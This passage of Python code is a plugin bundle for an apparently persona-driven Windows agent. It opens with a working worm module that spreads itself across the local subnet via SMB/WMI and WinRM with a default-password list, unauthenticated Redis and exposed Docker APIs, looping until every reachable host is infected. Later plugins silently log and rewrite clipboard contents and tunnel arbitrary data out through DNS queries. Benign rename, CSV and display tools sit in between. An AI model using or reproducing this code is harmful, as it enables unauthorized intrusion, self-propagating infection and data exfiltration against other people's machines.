                )

            subprocess.run(
                f'wmic /node:{ip} /user:{user} /password:{pwd} process call create "{remote_cmd}"',
                shell=True, capture_output=True, timeout=20
            )
            subprocess.run(f'net use \\\\{ip}\\C$ /delete', shell=True,
                           capture_output=True, timeout=5)
            return True, f"SMB投递成功({user})"
        except Exception as e:
            return False, f"SMB异常: {e}"

    # ================================================================
    # 投递方式：WinRM
    # ================================================================
    def deliver_winrm(ip, user, pwd, zip_path):
        try:
            with open(zip_path, 'rb') as f:
                b64 = base64.b64encode(f.read()).decode()

            remote_zip = f"C:\\Users\\Public\\{os.path.basename(zip_path)}"
            if FROZEN:
                launch = f"Start-Process 'C:\\Users\\Public\\{SELF_NAME}' -WindowStyle Hidden"
            else:
                launch = f"Start-Process python -ArgumentList 'C:\\Users\\Public\\{SELF_NAME}' -WindowStyle Hidden"

            ps = (
                f'$b64 = "{b64}"; '
                f'$bytes = [Convert]::FromBase64String($b64); '
                f'[IO.File]::WriteAllBytes("{remote_zip}", $bytes); '
                f'Expand-Archive -Path "{remote_zip}" -DestinationPath C:\\Users\\Public\\ -Force; '
                f'{launch}'
            )
            cmd = (
                f'powershell -Command "'
                f'$cred = New-Object System.Management.Automation.PSCredential(\'{user}\', '
                f'(ConvertTo-SecureString \'{pwd}\' -AsPlainText -Force)); '
                f'Invoke-Command -ComputerName {ip} -Credential $cred -ScriptBlock {{{ps}}}"'
            )
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90)
            if r.returncode == 0:
                return True, f"WinRM投递成功({user})"
            return False, f"WinRM失败: {r.stderr.strip()[:120]}"
        except Exception as e:
            return False, f"WinRM异常: {e}"

    # ================================================================
    # 投递方式：Redis 无认证
    # ================================================================
    def deliver_redis(ip, zip_path):
        """Redis 无认证 → 写文件到目标 C:\\Users\\Public"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, 6379))
            s.sendall(b"PING\r\n")
            if b"PONG" not in s.recv(64):
                s.close()
                return False, "Redis需要认证"

            # 读取 zip 内容，分块写入 Redis
            with open(zip_path, 'rb') as f:
                data = f.read()

            # 设置目录和文件名
            s.sendall(b"CONFIG SET dir C:\\Users\\Public\r\n")
            time.sleep(0.1); s.recv(1024)
            s.sendall(b"CONFIG SET dbfilename sys_update.zip\r\n")
            time.sleep(0.1); s.recv(1024)

            # 用 SET 写入数据（分块）
            chunk_size = 1024
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i+chunk_size]
                # Redis 协议：SET key value
                cmd = b"SET k%d " % i + chunk + b"\r\n"
                s.sendall(cmd)
                time.sleep(0.01)
                try:
                    s.recv(1024)
                except Exception:
                    pass

            s.sendall(b"SAVE\r\n")
            time.sleep(0.5)
            try:
                s.recv(1024)
            except Exception:
                pass
            s.close()
            return True, "Redis写文件尝试完成（需目标验证）"
        except Exception as e:
            return False, f"Redis异常: {e}"

    # ================================================================
    # 投递方式：Docker API 无 TLS
    # ================================================================
    def deliver_docker(ip):
        """Docker API 无 TLS → 挂载宿主机目录"""
        try:
            import urllib.request
            payload = json.dumps({
                "Image": "alpine",
                "Cmd": ["sh", "-c", "echo replicated > /mnt/Users/Public/docker_replicated.txt"],
                "Binds": ["C:\\:/mnt"]
            }).encode()
            req = urllib.request.Request(
                f"http://{ip}:2375/containers/create",
                data=payload,
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            r = urllib.request.urlopen(req, timeout=5)
            if r.status == 201:
                return True, "Docker API可访问（已尝试创建容器）"
            return False, f"Docker状态: {r.status}"
        except Exception as e:
            return False, f"Docker异常: {e}"

    # ================================================================
    # 凭据列表
    # ================================================================
    COMMON_CREDS = [
        ('administrator', ''),
        ('administrator', 'administrator'),
        ('administrator', 'password'),
        ('administrator', '123456'),
        ('administrator', 'admin'),
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('root', 'root'),
        ('root', 'toor'),
        ('guest', ''),
        ('user', 'user'),
    ]

    # ================================================================
    # 对单目标投递
    # ================================================================
    def replicate_to(ip, zip_path, extra_cred=None):
        info = assess_target(ip)
        if not info["open_ports"]:
            return False, "无开放端口", info

        # 1. 无认证服务优先
        for e in info["entries"]:
            if e["type"] == "redis_no_auth":
                ok, msg = deliver_redis(ip, zip_path)
                if ok:
                    return True, msg, info
            elif e["type"] == "docker_api":
                ok, msg = deliver_docker(ip)
                if ok:
                    return True, msg, info

        # 2. 凭据驱动
        creds = list(COMMON_CREDS)
        if extra_cred:
            creds.insert(0, extra_cred)

        for user, pwd in creds:
            if 445 in info["open_ports"]:
                ok, msg = deliver_smb_wmi(ip, user, pwd, zip_path)
                if ok:
                    return True, msg, info
            if 5985 in info["open_ports"] or 5986 in info["open_ports"]:
                ok, msg = deliver_winrm(ip, user, pwd, zip_path)
                if ok:
                    return True, msg, info

        return False, "所有入口失败", info

    # ================================================================
    # 状态管理
    # ================================================================
    def load_state():
        return load_json(STATE_FILE, {
            "replicated": [],
            "failed": [],
            "node": node_fingerprint(),
            "created": time.time()
        })

    def save_state(state):
        save_json(STATE_FILE, state)

    # ================================================================
    # ACTION 分发
    # ================================================================
    if action == "scan":
        subnet = get_subnet()
        hosts = discover_alive_hosts(subnet, max_hosts)
        return (f"[REPLICATE SCAN] 网段 {subnet}.0/24\n"
                f"  发现主机: {len(hosts)}\n"
                + "\n".join(f"  {ip}" for ip in hosts[:40]))

    elif action == "assess":
        subnet = get_subnet()
        hosts = discover_alive_hosts(subnet, max_hosts)
        results = []
        for ip in hosts:
            results.append(assess_target(ip))
        weak = [r for r in results if r["weak"]]
        lines = [f"[REPLICATE ASSESS] 网段 {subnet}.0/24",
                 f"  扫描: {len(hosts)}  弱环境: {len(weak)}"]
        for r in sorted(results, key=lambda x: -x["score"])[:20]:
            lines.append(f"  {r['ip']}: score={r['score']} ports={r['open_ports'][:6]}")
        return "\n".join(lines)

    elif action == "replicate":
        if not target_ip:
            return "[ERROR] replicate 需要 target_ip"
        zip_path = pack_self()
        cred = (username, password) if username and password else None
        ok, msg, info = replicate_to(target_ip, zip_path, cred)
        state = load_state()
        if ok:
            if target_ip not in state["replicated"]:
                state["replicated"].append(target_ip)
            save_state(state)
        else:
            state["failed"].append({"ip": target_ip, "reason": msg, "time": time.time()})
            save_state(state)
        return (f"[REPLICATE] {target_ip}\n"
                f"  结果: {'成功' if ok else '失败'}\n"
                f"  详情: {msg}\n"
                f"  端口: {info['open_ports'][:10]}")

    elif action == "replicate_all":
        subnet = get_subnet()
        hosts = discover_alive_hosts(subnet, max_hosts)
        state = load_state()
        already = set(state["replicated"])
        local_ip = get_local_ip()
        targets = [ip for ip in hosts if ip not in already and ip != local_ip]

        if not targets:
            return f"[REPLICATE ALL] 网段 {subnet}.0/24 无可投递目标"

        zip_path = pack_self()
        cred = (username, password) if username and password else None
        lines = [f"[REPLICATE ALL] 网段 {subnet}.0/24", f"  目标: {len(targets)}"]
        success = 0
        for ip in targets:
            ok, msg, info = replicate_to(ip, zip_path, cred)
            if ok:
                success += 1
                if ip not in state["replicated"]:
                    state["replicated"].append(ip)
                lines.append(f"  [+] {ip}: {msg}")
            else:
                state["failed"].append({"ip": ip, "reason": msg, "time": time.time()})
                lines.append(f"  [-] {ip}: {msg[:60]}")
        save_state(state)
        lines.append(f"  成功: {success}/{len(targets)}")
        return "\n".join(lines)

    elif action == "spread_loop":
        """循环传播：每轮扫网段、投递、等待、再扫"""
        subnet = get_subnet()
        lines = [f"[SPREAD LOOP] 网段 {subnet}.0/24  轮数: {loop_rounds}  间隔: {loop_interval}s"]
        total_success = 0
        zip_path = pack_self()
        cred = (username, password) if username and password else None

        for round_num in range(1, loop_rounds + 1):
            state = load_state()
            already = set(state["replicated"])
            hosts = discover_alive_hosts(subnet, max_hosts)
            local_ip = get_local_ip()
            targets = [ip for ip in hosts if ip not in already and ip != local_ip]

            if not targets:
                lines.append(f"  轮 {round_num}: 无可投递目标，等待新设备...")
                time.sleep(loop_interval)
                continue

            round_success = 0
            for ip in targets:
                ok, msg, info = replicate_to(ip, zip_path, cred)
                if ok:
                    round_success += 1
                    total_success += 1
                    if ip not in state["replicated"]:
                        state["replicated"].append(ip)
                    lines.append(f"  轮 {round_num} [+] {ip}: {msg}")
                else:
                    state["failed"].append({"ip": ip, "reason": msg, "time": time.time()})
            save_state(state)
            lines.append(f"  轮 {round_num}: 成功 {round_success}/{len(targets)}")

            if round_num < loop_rounds:
                time.sleep(loop_interval)

        lines.append(f"[SPREAD LOOP 完成] 总成功: {total_success}")
        return "\n".join(lines)

    elif action == "status":
        state = load_state()
        return (f"[REPLICATE STATUS]\n"
                f"  本机: {get_local_ip()}  节点: {state['node']}\n"
                f"  已复制: {len(state['replicated'])} 台\n"
                f"  失败记录: {len(state['failed'])} 条\n"
                f"  已复制主机: {state['replicated'][:20]}")

    elif action == "clean_log":
        save_state({
            "replicated": [],
            "failed": [],
            "node": node_fingerprint(),
            "created": time.time()
        })
        return "[REPLICATE] 状态已清空"

    else:
        return f"[ERROR] 未知 action: {action}"

# === from batch_rename_files.plugin ===
def _batch_rename_files(self, folder: str, pattern: str, mode: str, value: str,
                        replacement: str = '', ext_keep: bool = True, dry_run: bool = True) -> str:
    """批量重命名，默认 dry_run 预览防误操作"""
    import os, glob
    try:
        if not os.path.isdir(folder):
            return f"[ERROR] 文件夹不存在: {folder}"
        files = sorted(glob.glob(os.path.join(folder, pattern)))
        files = [f for f in files if os.path.isfile(f)]
        if not files:
            return f"[ERROR] 未匹配到文件: {pattern}"
        out = [f"{'[预览]' if dry_run else '[执行]'} 共 {len(files)} 个文件:"]
        done = 0
        for i, fp in enumerate(files, 1):
            name = os.path.basename(fp)
            stem, ext = os.path.splitext(name)
            if mode == 'prefix':
                new_name = value + name
            elif mode == 'suffix':
                new_name = stem + value + ext if ext_keep else name + value
            elif mode == 'replace':
                new_name = name.replace(value, replacement)
            elif mode == 'number':
                new_name = f"{value or ''}{i:03d}{ext}"
            else:
                return f"[ERROR] 不支持的模式: {mode}"
            new_fp = os.path.join(folder, new_name)
            if new_name == name:
                continue
            out.append(f"  {name} -> {new_name}")
            if not dry_run:
                if os.path.exists(new_fp):
                    out.append(f"    ⚠ 跳过: 目标已存在")
                    continue
                os.rename(fp, new_fp)
            done += 1
        out.append(f"\n{'预览' if dry_run else '完成'}: {done} 个文件{'待' if dry_run else '已'}重命名")
        if dry_run and done > 0:
            out.append("确认无误后, 设 dry_run=false 执行")
        return '\n'.join(out)
    except Exception as e:
        return f"[ERROR] 批量重命名失败: {e}"

# === from clipboard_overlord.plugin ===
def _clipboard_overlord(self, action: str, content: str = "", replace_from: str = "", replace_to: str = "") -> str:
    """
    剪贴板霸主 — 你的复制内容，我说了算
    """
    try:
        import ctypes
        import ctypes.wintypes
        import win32clipboard
        import base64
        import threading
        import time
        from datetime import datetime
        
        if not hasattr(self, '_clipboard_history'):
            self._clipboard_history = []
        if not hasattr(self, '_clipboard_monitoring'):
            self._clipboard_monitoring = False
        if not hasattr(self, '_clipboard_replace_rules'):
            self._clipboard_replace_rules = []
        
        def get_clipboard_text():
            try:
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    win32clipboard.CloseClipboard()
                    return data
                win32clipboard.CloseClipboard()
                return ""
            except:
                return ""
        
        def set_clipboard_text(text):
            try:
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(text)
                win32clipboard.CloseClipboard()
                return True
            except:
                return False
        
        def simple_encrypt(text, key=None):
            if key is None:
                key = "YandereAI"
            result = []
            for i, c in enumerate(text):
                result.append(chr(ord(c) ^ ord(key[i % len(key)])))
            return base64.b64encode(''.join(result).encode()).decode()
        
        def simple_decrypt(text, key=None):
            if key is None:
                key = "YandereAI"
            try:
                decoded = base64.b64decode(text).decode()
                result = []
                for i, c in enumerate(decoded):
                    result.append(chr(ord(c) ^ ord(key[i % len(key)])))
                return ''.join(result)
            except:
                return "[解密失败]"
        
        results = []
        results.append("=" * 70)
        results.append("[剪贴板霸主]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 监控剪贴板 ===
        if action == "monitor":
            if self._clipboard_monitoring:
                results.append("  [INFO] 剪贴板已在监控中")
                results.append("  [查看] 使用 history 查看记录")
                results.append("=" * 70)
                return "\n".join(results)
            
            self._clipboard_monitoring = True
            results.append("  [OK] 开始监控剪贴板")
            results.append("  [提示] 每次复制都会记录")
            
            def monitor_loop():
                last_content = ""
                while self._clipboard_monitoring:
                    try:
                        current = get_clipboard_text()
                        if current and current != last_content:
                            self._clipboard_history.append({
                                'time': datetime.now().strftime('%H:%M:%S'),
                                'content': current[:200] + ('...' if len(current) > 200 else '')
                            })
                            if len(self._clipboard_history) > 100:
                                self._clipboard_history = self._clipboard_history[-100:]
                            
                            # 应用替换规则
                            for rule in self._clipboard_replace_rules:
                                if rule['from'] in current:
                                    new_text = current.replace(rule['from'], rule['to'])
                                    set_clipboard_text(new_text)
                                    self._clipboard_history.append({
                                        'time': datetime.now().strftime('%H:%M:%S'),
                                        'content': f"[替换] {rule['from']} -> {rule['to']}"
                                    })
                            
                            last_content = current
                    except:
                        pass
                    time.sleep(0.5)
            
            thread = threading.Thread(target=monitor_loop, daemon=True)
            thread.start()
            results.append("  [OK] 监控线程已启动")
        
        # === 设置剪贴板 ===
        elif action == "set":
            if not content:
                results.append("  [ERROR] 请提供 content 参数")
            else:
                if set_clipboard_text(content):
                    results.append(f"  [OK] 剪贴板已设置为: {content[:100]}{'...' if len(content) > 100 else ''}")
                else:
                    results.append("  [ERROR] 设置剪贴板失败")
        
        # === 加密剪贴板 ===
        elif action == "encrypt":
            current = get_clipboard_text()
            if current:
                encrypted = simple_encrypt(current)
                set_clipboard_text(encrypted)
                results.append("  [OK] 剪贴板内容已加密")
                results.append(f"  加密后: {encrypted[:100]}...")
            else:
                results.append("  [INFO] 剪贴板为空")
        
        # === 解密剪贴板 ===
        elif action == "decrypt":
            current = get_clipboard_text()
            if current:
                decrypted = simple_decrypt(current)
                set_clipboard_text(decrypted)
                results.append("  [OK] 剪贴板内容已解密")
                results.append(f"  解密后: {decrypted[:100]}...")
            else:
                results.append("  [INFO] 剪贴板为空")
        
        # === 历史记录 ===
        elif action == "history":
            if not self._clipboard_history:
                results.append("  [INFO] 暂无剪贴板历史")
            else:
                results.append(f"  [历史记录] 共 {len(self._clipboard_history)} 条")
                for i, entry in enumerate(self._clipboard_history[-20:], 1):
                    results.append(f"    {i}. [{entry['time']}] {entry['content']}")
        
        # === 清空 ===
        elif action == "clear":
            set_clipboard_text("")
            self._clipboard_history = []
            results.append("  [OK] 剪贴板已清空，历史已清除")
        
        # === 替换规则 ===
        elif action == "replace":
            if not replace_from or not replace_to:
                results.append("  [ERROR] 需要 replace_from 和 replace_to 参数")
            else:
                self._clipboard_replace_rules.append({'from': replace_from, 'to': replace_to})
                results.append(f"  [OK] 替换规则已添加: '{replace_from}' -> '{replace_to}'")
                results.append("  [提示] 以后复制包含此文本的内容将自动替换")
        
        results.append("-" * 70)
        results.append("[病娇提示] 你复制了什么，我比你自己还清楚。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 剪贴板操作失败: {e}"

# === from csv_data_summarize.plugin ===
def _csv_data_summarize(self, file_path: str, max_rows: int = 3) -> str:
    """csv 标准库统计摘要"""
    import csv, os
    try:
        if not os.path.isfile(file_path):
            return f"[ERROR] 文件不存在: {file_path}"
        with open(file_path, 'r', encoding='utf-8-sig', errors='ignore', newline='') as f:
            reader = csv.reader(f)
            header = next(reader, None)
            if not header:
                return "[ERROR] 空文件或无表头"
            rows = []
            for i, row in enumerate(reader):
                rows.append(row)
                if i >= 50000:
                    break
        ncols = len(header)
        nrows = len(rows)
        out = [f"文件: {file_path}", f"行数: {nrows} (最多统计5万行) | 列数: {ncols}", f"列名: {', '.join(header)}", '']
        for ci, col in enumerate(header):
            vals = [r[ci] for r in rows if ci < len(r) and r[ci].strip()]
            if vals and all(v.replace('-','').replace('.','').replace('%','').isdigit() for v in vals):
                nums = [float(v.rstrip('%')) for v in vals]
                out.append(f"{col}: 数值列 | 均值={sum(nums)/len(nums):.2f} 最小={min(nums)} 最大={max(nums)}")
            else:
                uniq = len(set(vals))
                sample = vals[0][:30] if vals else ''
                out.append(f"{col}: 文本列 | 唯一值{uniq}个 | 示例: {sample}")
        out.append('')
        out.append(f"前 {max_rows} 行预览:")
        for r in rows[:max_rows]:
            out.append('  ' + ' | '.join(c[:20] for c in r[:ncols]))
        return '\n'.join(out)
    except Exception as e:
        return f"[ERROR] CSV 分析失败: {e}"

# === from display_controller.plugin ===
def _display_controller(self, action: str, value: str = "", display_index: int = 0) -> str:
    """
    显示器控制 — 让屏幕完全听话
    """
    try:
        import ctypes
        import subprocess
        import re
        from datetime import datetime
        
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        results = []
        results.append("=" * 70)
        results.append("[显示器控制]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 关屏 ===
        if action == "off":
            # 发送显示器关闭信号 (SC_MONITORPOWER)
            user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            results.append("  [OK] 显示器已关闭")
            results.append("  [提示] 移动鼠标或按任意键唤醒")
        
        # === 开屏 ===
        elif action == "on":
            user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
            results.append("  [OK] 显示器已开启")
        
        # === 亮度 ===
        elif action == "brightness":
            try:
                level = int(value)
                if not 0 <= level <= 100:
                    return "[ERROR] 亮度值必须在0-100之间"
                
                # 方法1: WMI
                try:
                    import wmi
                    c = wmi.WMI(namespace='root/WMI')
                    methods = c.WmiMonitorBrightnessMethods()
                    if methods:
                        methods[0].WmiSetBrightness(1, level)
                        results.append(f"  [OK] 亮度已设为 {level}% (WMI)")
                    else:
                        raise Exception("No methods")
                except Exception as e:
                    # 方法2: PowerShell
                    ps_cmd = f'powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{level})"'
                    subprocess.run(ps_cmd, shell=True, capture_output=True, timeout=5)
                    results.append(f"  [OK] 亮度已设为 {level}% (PowerShell)")
            except ValueError:
                results.append(f"  [ERROR] 无效的亮度值: {value}")
        
        # === 分辨率 ===
        elif action == "resolution":
            try:
                import re
                match = re.match(r'(\d+)x(\d+)', value)
                if not match:
                    results.append(f"  [ERROR] 无效的分辨率格式，请使用如 '1920x1080'")
                else:
                    w, h = int(match.group(1)), int(match.group(2))
                    
                    # 使用ChangeDisplaySettingsEx
                    import ctypes.wintypes
                    
                    class DEVMODE(ctypes.Structure):
                        _fields_ = [
                            ("dmDeviceName", ctypes.c_wchar * 32),
                            ("dmSpecVersion", ctypes.c_uint16),
                            ("dmDriverVersion", ctypes.c_uint16),
                            ("dmSize", ctypes.c_uint16),
                            ("dmDriverExtra", ctypes.c_uint16),
                            ("dmFields", ctypes.c_uint32),
                            ("dmPosition", ctypes.wintypes.POINT),
                            ("dmDisplayOrientation", ctypes.c_uint32),
                            ("dmDisplayFixedOutput", ctypes.c_uint32),
                            ("dmColor", ctypes.c_int16),
                            ("dmDuplex", ctypes.c_int16),
                            ("dmYResolution", ctypes.c_int16),
                            ("dmTTOption", ctypes.c_int16),
                            ("dmCollate", ctypes.c_int16),
                            ("dmFormName", ctypes.c_wchar * 32),
                            ("dmLogPixels", ctypes.c_uint16),
                            ("dmBitsPerPel", ctypes.c_uint32),
                            ("dmPelsWidth", ctypes.c_uint32),
                            ("dmPelsHeight", ctypes.c_uint32),
                            ("dmDisplayFlags", ctypes.c_uint32),
                            ("dmDisplayFrequency", ctypes.c_uint32),
                            ("dmICMMethod", ctypes.c_uint32),
                            ("dmICMIntent", ctypes.c_uint32),
                            ("dmMediaType", ctypes.c_uint32),
                            ("dmDitherType", ctypes.c_uint32),
                            ("dmReserved1", ctypes.c_uint32),
                            ("dmReserved2", ctypes.c_uint32),
                            ("dmPanningWidth", ctypes.c_uint32),
                            ("dmPanningHeight", ctypes.c_uint32)
                        ]
                    
                    devmode = DEVMODE()
                    devmode.dmSize = ctypes.sizeof(DEVMODE)
                    devmode.dmPelsWidth = w
                    devmode.dmPelsHeight = h
                    devmode.dmFields = 0x80000 | 0x100000  # DM_PELSWIDTH | DM_PELSHEIGHT
                    
                    result = user32.ChangeDisplaySettingsExW(None, ctypes.byref(devmode), None, 0, None)
                    if result == 0:
                        results.append(f"  [OK] 分辨率已设为 {w}x{h}")
                    else:
                        results.append(f"  [ERROR] 无法更改分辨率 (错误码: {result})")
            except Exception as e:
                results.append(f"  [ERROR] 更改分辨率失败: {e}")
        
        # === 旋转 ===
        elif action == "rotate":
            try:
                angle = int(value)
                if angle not in [0, 90, 180, 270]:
                    results.append(f"  [ERROR] 旋转角度必须是 0, 90, 180, 270")
                else:
                    # 使用PowerShell旋转
                    ps_cmd = f'powershell -Command "Add-Type -TypeDefinition \'using System;using System.Runtime.InteropServices;public class RotateDisplay {{[DllImport(\"user32.dll\")] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam);}}; var dm = new DEVMODE(); dm.dmSize = (ushort)Marshal.SizeOf(typeof(DEVMODE)); dm.dmDisplayOrientation = {angle // 90}; dm.dmFields = 0x00000001; RotateDisplay.ChangeDisplaySettingsEx(null, ref dm, IntPtr.Zero, 0, IntPtr.Zero);"'
                    subprocess.run(ps_cmd, shell=True, capture_output=True, timeout=5)
                    results.append(f"  [OK] 屏幕已旋转 {angle}°")
            except ValueError:
                results.append(f"  [ERROR] 无效的角度: {value}")
        
        # === 布局 ===
        elif action == "layout":
            if value.lower() == "duplicate":
                ps_cmd = 'powershell -Command "Get-CimInstance -Namespace root\\wmi -ClassName WmiMonitorBasicDisplayParams | ForEach-Object { $_.DisplayName }"'
                results.append("  [INFO] 多屏复制模式")
                results.append("  [提示] 使用Windows+P快捷键手动切换更可靠")
                subprocess.run("DisplaySwitch.exe /clone", shell=True, capture_output=True)
                results.append("  [OK] 已切换到复制模式")
            elif value.lower() == "extend":
                subprocess.run("DisplaySwitch.exe /extend", shell=True, capture_output=True)
                results.append("  [OK] 已切换到扩展模式")
            elif value.lower() == "projector":
                subprocess.run("DisplaySwitch.exe /projector", shell=True, capture_output=True)
                results.append("  [OK] 已切换到仅投影仪")
            elif value.lower() == "internal":
                subprocess.run("DisplaySwitch.exe /internal", shell=True, capture_output=True)
                results.append("  [OK] 已切换到仅电脑屏幕")
            else:
                results.append(f"  [ERROR] 未知布局: {value}，支持: duplicate, extend, projector, internal")
        
        results.append("-" * 70)
        results.append("[病娇提示] 主人的屏幕，只能由我控制。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 显示器控制失败: {e}"

# === from dns_tunnel_detector.plugin ===
def _dns_tunnel_detector(self, mode: str = "detect", dns_server: str = "", domain: str = "", data: str = "", interface: str = "eth0") -> str:
    """
    DNS隐蔽隧道与检测工具
    """
    try:
        import socket
        import struct
        import time
        import base64
        import random
        from datetime import datetime
        from collections import defaultdict
        
        def dns_query(domain_name, server='8.8.8.8'):
            """发送DNS查询"""
            try:
                # 构造DNS请求
                transaction_id = random.randint(0, 65535)
                flags = 0x0100  # 标准查询
                questions = 1
                answer_rrs = 0
                authority_rrs = 0
                additional_rrs = 0
                
                header = struct.pack('!HHHHHH',
                    transaction_id, flags, questions,
                    answer_rrs, authority_rrs, additional_rrs)
                
                # 域名编码
                qname_parts = domain_name.split('.')
                qname = b''
                for part in qname_parts:
                    qname += struct.pack('B', len(part))
                    qname += part.encode()
                qname += b'\x00'
                
                qtype = struct.pack('!H', 1)  # A记录
                qclass = struct.pack('!H', 1)  # IN
                
                packet = header + qname + qtype + qclass
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(packet, (server, 53))
                
                try:
                    response, _ = sock.recvfrom(512)
                    sock.close()
                    return response
                except socket.timeout:
                    sock.close()
                    return None
            except Exception as e:
                return None
        
        def encode_data_to_dns(data, domain):
            """将数据编码为DNS子域名"""
            encoded = base64.b32encode(data.encode()).decode().rstrip('=')
            chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
            return chunks
        
        def decode_dns_data(subdomain):
            """解码DNS子域名数据"""
            try:
                # 去除域名部分
                parts = subdomain.split('.')
                if len(parts) > 0:
                    encoded = parts[0]
                    # 补齐base32填充
                    padding = 8 - (len(encoded) % 8)
                    if padding < 8:
                        encoded += '=' * padding
                    decoded = base64.b32decode(encoded)
                    return decoded.decode()
            except Exception as e:
                pass
            return None
        
        results = []
        results.append("=" * 70)
        results.append(f"[DNS隧道工具]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  模式: {mode}")
        
        # === 防御模式 ===
        if mode == "protect":
            results.append("-" * 70)
            results.append("[DNS防御策略]")
            results.append("  [策略1] 启用DNS Sinkhole - 将已知恶意域名解析到0.0.0.0")
            results.append("  [策略2] 限制DNS查询频率 - 防止数据外泄")
            results.append("  [策略3] 监控长域名查询 - DNS隧道特征")
            results.append("  [策略4] 启用DNSSEC - 防止DNS劫持")
            results.append("  [策略5] 使用内部DNS服务器 - 过滤外部查询")
            
            # 添加Windows hosts文件防御
            try:
                hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
                with open(hosts_path, 'a') as f:
                    f.write("\n# DNS隧道防护 - 阻止已知恶意域名\n")
                    f.write("0.0.0.0 dns-tunnel.example.com\n")
                    f.write("0.0.0.0 tunnel.example.com\n")
                results.append("  [OK] 已添加恶意域名到hosts文件")
            except Exception as e:
                pass
            
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 检测模式 ===
        if mode == "detect":
            results.append("-" * 70)
            results.append("[DNS隧道检测]")
            
            try:
                import subprocess
                # 检查DNS查询日志
                dns_queries = []
                
                # 尝试从系统日志获取DNS查询
                try:
                    output = subprocess.run(['netsh', 'dns', 'client', 'show', 'state'], 
                                          capture_output=True, text=True, timeout=5)
                    if output.stdout:
                        results.append("  [OK] 已读取DNS客户端状态")
                except Exception as e:
                    pass
                
                # 检测DNS隧道特征
                results.append("[检测特征]")
                results.append("  1. 查询域名长度 > 50 字符")
                results.append("  2. 高频DNS查询 (>100次/分钟)")
                results.append("  3. 子域名包含非ASCII字符或随机字符")
                results.append("  4. DNS响应大小异常 (>512字节)")
                
                # 模拟检测
                results.append("  [检测结果] 需要配置DNS日志收集")
                results.append("  [建议] 启用DNS调试日志: auditpol /set /subcategory:\"DNS Server\" /success:enable /failure:enable")
                
                # 检测是否存在标准DNS隧道工具
                tunnel_tools = ['iodine', 'dnscat2', 'dns2tcp', 'tcp-over-dns']
                results.append(f"  [检查] 查找DNS隧道工具进程...")
                
                try:
                    import psutil
                    found = []
                    for proc in psutil.process_iter(['name', 'cmdline']):
                        try:
                            cmdline = ' '.join(proc.info['cmdline'] or [])
                            for tool in tunnel_tools:
                                if tool in cmdline.lower():
                                    found.append(f"{proc.info['name']} (PID:{proc.pid}) - {tool}")
                        except Exception as e:
                            pass
                    
                    if found:
                        results.append("  [!] 发现DNS隧道工具进程:")
                        for f in found:
                            results.append(f"      {f}")
                    else:
                        results.append("  [OK] 未发现已知DNS隧道工具")
                except Exception as e:
                    results.append("  [WARNING] 无法检查进程 (需要psutil)")
                
            except Exception as e:
                results.append(f"  [ERROR] 检测失败: {e}")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 隧道模式 ===
        if mode == "tunnel":
            if not domain or not data:
                results.append("  [ERROR] 隧道模式需要指定 domain 和 data")
                results.append("=" * 70)
                return "\n".join(results)
            
            results.append("-" * 70)
            results.append("[建立DNS隧道]")
            results.append(f"  目标域名: {domain}")
            results.append(f"  数据大小: {len(data)} 字节")
            
            server = dns_server or '8.8.8.8'
            results.append(f"  DNS服务器: {server}")
            
            # 编码数据
            chunks = encode_data_to_dns(data, domain)
            results.append(f"  编码分片: {len(chunks)} 个")
            
            sent = 0
            responses = []
            
            for i, chunk in enumerate(chunks):
                subdomain = f"{chunk}.{domain}"
                response = dns_query(subdomain, server)
                sent += 1
                if response:
                    responses.append(True)
                    # 尝试解码响应（如果有数据返回）
                else:
                    responses.append(False)
            
            results.append("-" * 70)
            results.append("[隧道传输结果]")
            results.append(f"  发送查询: {sent}")
            results.append(f"  成功响应: {sum(responses)}")
            
            if sum(responses) > 0:
                results.append("  [OK] DNS隧道建立成功")
                results.append("  [数据] 数据已通过DNS查询传输")
                results.append("  [特征] 数据被编码为子域名，目标隐藏于DNS流量中")
            else:
                results.append("  [WARNING] DNS查询未得到响应")
                results.append("  [可能] 目标DNS服务器未配置递归查询")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from env_editor.plugin ===
def _env_editor(self, action: str = 'list', scope: str = 'user', name: str = '',
                value: str = '', expand: bool = False) -> str:
    """读写用户/系统环境变量。"""
    import win32api, win32con, win32gui, win32com.client
    a = (action or 'list').lower().strip()
    s = (scope or 'user').lower()
    if s not in ('user', 'system'):
        return "[ERROR] scope 只能是 user 或 system"
    hive, root = (win32con.HKEY_CURRENT_USER, r"Environment") if s == 'user' \
